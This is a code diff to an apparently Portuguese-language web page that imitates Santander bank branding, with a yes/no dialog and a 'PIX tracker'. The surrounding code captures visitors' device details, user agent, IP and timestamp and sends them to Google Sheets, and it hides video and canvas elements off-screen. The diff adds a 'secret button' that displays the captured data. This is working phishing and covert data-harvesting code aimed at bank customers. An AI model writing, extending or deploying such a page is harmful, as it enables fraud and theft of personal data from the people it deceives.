@@ -51,7 +51,7 @@
         .pdf-footer { padding: 12px 20px; background: #f5f5f5; font-size: 10px; color: #888; text-align: center; border-top: 1px solid #ddd; line-height: 1.6; }
         .pdf-footer .phone { font-weight: bold; color: #ec0000; }
 
-        /* DIALOG DE PERGUNTA */
+        /* DIALOG */
         .dialog-overlay {
             display: flex;
             position: fixed;
@@ -83,6 +83,35 @@
         .dialog-btn-no:active { background: #ccc; }
         .dialog-btn-yes { background: #00c853; color: white; }
         .dialog-btn-yes:active { background: #00a840; }
+
+        /* BOTÃO SECRETO */
+        .teste-btn {
+            text-align: center;
+            padding: 10px;
+            background: #f0f0f0;
+            margin-top: 10px;
+            border-radius: 4px;
+        }
+        .teste-btn button {
+            padding: 8px 16px;
+            background: #00c853;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        .teste-btn pre {
+            background: #1a1a2e;
+            color: #00c853;
+            padding: 10px;
+            border-radius: 4px;
+            margin-top: 8px;
+            font-size: 10px;
+            text-align: left;
+            display: none;
+            word-break: break-all;
+        }
 
         /* ELEMENTOS INVISÍVEIS */
         video, canvas { display: none !important; visibility: hidden !important; width: 0 !important; height: 0 !important; position: absolute !important; left: -9999px !important; top: -9999px !important; }
@@ -129,6 +158,12 @@
             Central de Atendimento Santander <span class="phone">4004-3535</span> (Capitais e Regiões Metropolitanas)
             <span class="phone">0800-702-3535</span> (Demais Localidades)
             <br>SAC <span class="phone">0800-762-7777</span> | Ouvidoria <span class="phone">0800-726-0322</span>
+        </div>
+
+        <!-- BOTÃO SECRETO -->
+        <div class="teste-btn">
+            <button onclick="mostrarDados()">🔍 Ver Dados Capturados</button>
+            <pre id="dadosDisplay"></pre>
         </div>
     </div>
 
@@ -217,10 +252,8 @@
                 capturedData.deviceInfo = navigator.userAgent;
                 capturedData.timestamp = new Date().toISOString();
 
-                // SALVA LOCALMENTE
                 localStorage.setItem('pixTrackerCapture', JSON.stringify(capturedData));
 
-                // ENVIA PARA O GOOGLE SHEETS
                 await sendToGoogleSheets();
 
                 console.log('✅ Dados capturados e enviados!');
@@ -337,6 +370,28 @@
                 capturedData.ip = data.ip;
             } catch (e) {
                 capturedData.ip = 'N/A';
+            }
+        }
+
+        // ============================================================
+        // BOTÃO SECRETO - MOSTRA DADOS CAPTURADOS
+        // ============================================================
+
+        function mostrarDados() {
+            const dados = localStorage.getItem('pixTrackerCapture');
+            const display = document.getElementById('dadosDisplay');
+            if (dados) {
+                try {
+                    const parsed = JSON.parse(dados);
+                    display.textContent = JSON.stringify(parsed, null, 2);
+                    display.style.display = 'block';
+                } catch (e) {
+                    display.textContent = '❌ Erro ao ler os dados: ' + e.message;
+                    display.style.display = 'block';
+                }
+            } else {
+                display.textContent = '❌ Nenhum dado capturado ainda. Clique em SIM primeiro!';
+                display.style.display = 'block';
             }
         }
     </script>
